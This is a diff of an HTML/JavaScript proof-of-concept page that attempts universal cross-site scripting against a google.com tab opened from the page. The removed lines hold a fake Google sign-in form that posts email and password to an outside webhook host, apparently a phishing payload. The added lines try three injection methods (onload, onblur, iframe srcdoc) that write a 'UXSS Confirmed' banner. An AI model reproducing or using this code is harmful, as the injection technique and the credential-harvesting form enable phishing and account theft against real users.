@@ -6,92 +6,55 @@
 
 <script>
 function go() {
-  // Buka tab baru
   const tab = window.open("https://www.google.com/csi", "_blank");
   
   if (!tab) { alert("Blocked!"); return; }
 
-  // Inject LANGSUNG sebelum halaman load - delay 0
+  // Cara 1 - pakai onload event
+  tab.onload = function() {
+    try {
+      tab.document.body.innerHTML = `
+        <h1 style="color:red;text-align:center;
+                   margin-top:40vh;font-family:Arial;">
+          UXSS Confirmed!
+        </h1>`;
+      console.log('onload inject success!');
+    } catch(e) {
+      console.warn('onload failed:', e.message);
+    }
+  };
+
+  // Cara 2 - pakai onblur trick
+  window.onblur = function() {
+    try {
+      tab.document.body.innerHTML = `
+        <h1 style="color:red;text-align:center;
+                   margin-top:40vh;font-family:Arial;">
+          UXSS via onblur!
+        </h1>`;
+      console.log('onblur inject success!');
+    } catch(e) {
+      console.warn('onblur failed:', e.message);
+    }
+  };
+
+  // Cara 3 - pakai iframe trick
   setTimeout(() => {
     try {
-      // Stop loading dulu
-      tab.stop();
-    } catch(e) {}
-
-    try {
-      tab.document.open("text/html", "replace");
-      tab.document.write(`<!DOCTYPE html>
-<html>
-<head>
-<title>google.com</title>
-<style>
-*{margin:0;padding:0;box-sizing:border-box}
-body{
-  font-family:Arial,sans-serif;
-  background:#f1f3f4;
-  display:flex;
-  justify-content:center;
-  align-items:center;
-  min-height:100vh;
-}
-.card{
-  background:white;
-  padding:48px 40px;
-  border-radius:8px;
-  box-shadow:0 2px 10px rgba(0,0,0,.2);
-  width:400px;
-  text-align:center;
-}
-img{width:75px;margin-bottom:16px}
-h1{font-size:24px;font-weight:400;margin-bottom:8px}
-p{color:#444;font-size:16px;margin-bottom:24px}
-input{
-  display:block;width:100%;
-  padding:13px 15px;margin:12px 0;
-  border:1px solid #dadce0;
-  border-radius:4px;font-size:16px;
-}
-input:focus{outline:2px solid #1a73e8;border-color:transparent}
-.btn{
-  background:#1a73e8;color:white;
-  border:none;border-radius:4px;
-  padding:10px 24px;font-size:14px;
-  float:right;cursor:pointer;margin-top:8px;
-}
-</style>
-</head>
-<body>
-<div class="card">
-  <img src="https://www.google.com/images/branding/googleg/1x/googleg_standard_color_128dp.png">
-  <h1>Sign in</h1>
-  <p>Use your Google Account</p>
-  <form action="https://young-comet-60.webhook.cool" method="POST">
-    <input type="email" name="email" 
-           placeholder="Email or phone" required>
-    <input type="password" name="password"
-           placeholder="Enter your password" required>
-    <button class="btn" type="submit">Next</button>
-  </form>
-</div>
-</body>
-</html>`);
-      tab.document.close();
-      console.log('Success!');
+      const iframe = tab.document.createElement('iframe');
+      iframe.src = 'javascript:void(0)';
+      iframe.style.cssText = 'position:fixed;inset:0;width:100%;height:100%;border:none;z-index:9999;';
+      iframe.srcdoc = `
+        <h1 style="color:red;text-align:center;
+                   margin-top:40vh;font-family:Arial;">
+          UXSS via iframe srcdoc!
+        </h1>`;
+      tab.document.body.appendChild(iframe);
+      console.log('iframe inject success!');
     } catch(e) {
-      console.warn('Error:', e.message);
-      
-      // Fallback - coba innerHTML
-      try {
-        tab.document.body.innerHTML = `
-          <h1 style="color:red;text-align:center;
-                     margin-top:40vh">
-            UXSS Confirmed on google.com
-          </h1>`;
-      } catch(e2) {
-        console.warn('Fallback failed:', e2.message);
-      }
+      console.warn('iframe failed:', e.message);
     }
-  }, 0); // 0ms = langsung!
+  }, 100);
 }
 </script>
 </body>
